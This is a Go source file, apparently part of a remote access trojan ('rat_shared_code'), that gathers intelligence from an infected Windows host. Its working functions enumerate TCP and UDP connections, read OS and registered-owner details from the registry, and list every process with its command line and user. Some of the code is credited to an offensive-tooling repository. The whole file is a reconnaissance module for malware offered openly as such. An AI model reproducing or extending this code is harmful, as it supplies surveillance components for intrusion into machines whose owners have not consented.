/*/
This file contains the code for gathering host intelligence
	-uses code from the following sources of open source information
		https://github.com/bluesentinelsec/OffensiveGoLang/blob/master/pkg/windows/discovery/processes.go
/*/

package rat_shared_code

// import the libraries we need
import (
	"strconv"

	// necessary for gathering process information
	"github.com/shirou/gopsutil/process"
	// necessary for getting netowork information
	"github.com/cakturk/go-netstat/netstat"
	// Software information Enumeration
	"golang.org/x/sys/windows/registry"
)

/*
Function to gather information about the host
the rat is in residence on
*/
//func gather_intel(intel_struct HostIntel) (HostIntel, error) {
// Get all network interfaces
//interfaces, _ := net.Interfaces()
//HostIntel.interfaces = interfaces
//return _, nil

//}

// ToDo: add functions for IPv6 connections

// GetTCPConnections returns a slice describing TCP connections
func GetTCPConnections() ([]netstat.SockTabEntry, error) {

	// TCP sockets
	socks, err := netstat.TCPSocks(netstat.NoopFilter)
	if err != nil {
		return nil, err
	}
	return socks, err
}

// GetUDPConnections returns a slice describing UDP connections
func GetUDPConnections() ([]netstat.SockTabEntry, error) {
	// UDP sockets
	socks, err := netstat.UDPSocks(netstat.NoopFilter)
	if err != nil {
		return nil, err
	}
	return socks, err
}

// code from:
// https://github.com/bluesentinelsec/OffensiveGoLang/blob/master/pkg/windows/discovery/os.go
// GetOSinfo returns information about the target system OS
func GetOSinfo() (OSinfo, error) {
	var osInfo OSinfo
	key := `SOFTWARE\Microsoft\Windows NT\CurrentVersion`

	k, err := registry.OpenKey(registry.LOCAL_MACHINE, key, registry.QUERY_VALUE)
	if err != nil {
		return osInfo, err
	}
	defer k.Close()
	osInfo.InstallationType, _, _ = k.GetStringValue("InstallationType")
	osInfo.ProductID, _, _ = k.GetStringValue("ProductId")
	osInfo.ProductName, _, _ = k.GetStringValue("ProductName")
	osInfo.RegisteredOwner, _, _ = k.GetStringValue("RegisteredOwner")
	osInfo.ReleaseID, _, _ = k.GetStringValue("ReleaseId")
	osInfo.CurrentBuild, _, _ = k.GetStringValue("CurrentBuild")
	// ToDo: convert epoc times to readable format
	osInfo.InstallDate, _, _ = k.GetIntegerValue("InstallDate")
	osInfo.InstallTime, _, _ = k.GetIntegerValue("InstallTime")

	return osInfo, nil
}

// Procs returns a slice of process objects
// Look at "PrintProcSummary()" and "PrintProcDetails()" for examples on displaying the process info
func Procs() ([][]string, error) {
	procs, err := process.Processes()
	if err != nil {
		return nil, err
	}
	processes := make([][]string, 0)
	for _, ps := range procs {
		// assign each process value to a variable
		i := ps.Pid
		pid := strconv.Itoa(int(i))

		i, _ = ps.Ppid()
		pPid := strconv.Itoa(int(i))

		pName, _ := ps.Name()
		pCmdLine, _ := ps.Cmdline()

		//pCreate, _ := ps.CreateTime()

		pUser, err := ps.Username()
		if err != nil {
			pUser = "Access Denied"
		}

		p := make([]string, 0)
		p = append(p, pid, pPid, pName, pCmdLine, pUser)

		// append each process, p, to the processes slice
		processes = append(processes, p)
	}
	return processes, nil
}
